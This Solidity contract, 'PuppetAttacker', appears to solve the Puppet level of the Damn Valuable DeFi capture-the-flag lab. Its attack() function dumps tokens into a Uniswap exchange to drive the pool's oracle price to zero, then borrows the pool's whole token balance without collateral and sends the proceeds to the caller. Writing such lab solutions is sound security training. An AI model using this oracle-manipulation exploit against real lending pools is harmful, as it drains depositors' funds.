pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface UniswapExchangeInterface {
    // Trade ERC20 to ETH
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256  eth_bought);
}

contract PuppetAttacker {
  using SafeMath for uint256;

  PuppetPool public pool;
  UniswapExchangeInterface public uni;
  DamnValuableToken public token;

  constructor (address poolAddress, address uniAddress, address tokenAddress) public {
    pool = PuppetPool(poolAddress);
    uni = UniswapExchangeInterface(uniAddress);
    token = DamnValuableToken(tokenAddress);
  }

  function attack() public {
    uint initBalance = token.balanceOf(address(this));
    token.approve(address(uni), initBalance);
    // selling tokens
    uni.tokenToEthSwapInput(initBalance, 1, now);
    // price === 0 after the trade :/ 
    uint price = pool.computeOraclePrice();
    // no need to add value, price === 0
    pool.borrow{value: 0}(token.balanceOf(address(pool)));
    
    uint endTokenBalance = token.balanceOf(address(this));
    token.transfer(msg.sender, endTokenBalance);

    msg.sender.transfer(address(this).balance);
  }

  receive() external payable {}

} 